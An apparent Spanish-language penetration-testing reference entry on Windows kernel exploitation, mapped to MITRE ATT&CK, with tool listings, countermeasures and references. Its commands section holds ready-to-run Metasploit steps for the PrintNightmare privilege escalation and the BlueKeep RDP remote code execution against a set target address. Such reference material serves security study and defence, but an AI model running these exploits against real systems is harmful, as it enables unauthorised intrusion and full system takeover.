# Explotación de Kernel Windows

## Descripción
La explotación del kernel de Windows permite a un atacante elevar privilegios al nivel de SYSTEM o ejecutar código de forma remota (RCE) mediante la explotación de vulnerabilidades en el núcleo de Windows (ntoskrnl.exe) o en controladores de terceros (drivers). Vulnerabilidades críticas como BlueKeep (RDP) o PrintNightmare (Spooler) han demostrado la capacidad de comprometer sistemas enteros aprovechando debilidades en servicios que operan con privilegios elevados dentro del sistema operativo.

## Clasificación
- **Fase**: Explotación
- **MITRE ATT&CK**: T1068 (Exploitation for Privilege Escalation); T1210 (Exploitation of Remote Services)
- **Plataforma**: Windows
- **Dificultad**: Avanzada

## Herramientas
- **Metasploit Framework** (`exploit/windows/rdp/cve_2019_0708_bluekeep_rce`) — incluye módulos robustos para explotar vulnerabilidades de kernel conocidas.
- **Sherlock** / **Watson** — scripts de PowerShell y C# que analizan un sistema Windows en busca de parches faltantes relacionados con exploits de kernel.
- **Mimikatz** — aunque es una herramienta de post-explotación, se integra con exploits de kernel para la manipulación de tokens.

## Comandos / Ejemplos

### Escaneo de vulnerabilidades con Watson
```powershell
# Ejecutar Watson para identificar parches faltantes de elevación de privilegios
.\Watson.exe
# Resultado: "Vulnerable to CVE-2020-0668 (Service Tracing)"
```

### Explotación de PrintNightmare (CVE-2021-34527)
```bash
# Uso de un módulo de Metasploit para elevar privilegios
use exploit/windows/local/printnightmare_lpe
set SESSION 1
run
```

### Explotación de BlueKeep (CVE-2019-0708)
```bash
# Configuración del exploit para RCE remoto vía RDP
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.50
set TARGET 1  # Forzar target específico de VirtualBox/VMWare
exploit
```

## Contramedidas
- Aplicar parches de seguridad de Microsoft (Patch Tuesday) de forma rigurosa.
- Deshabilitar servicios innecesarios que corran como SYSTEM (ej. Print Spooler si no hay impresoras).
- Implementar Windows Defender Exploit Guard para mitigar ataques basados en memoria.
- Activar VBS (Virtualization-Based Security) y HVCI para proteger la integridad del kernel.

## Referencias
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
- MITRE Corporation. (2024). ATT&CK Technique T1210: Exploitation of Remote Services. https://attack.mitre.org/techniques/T1210/
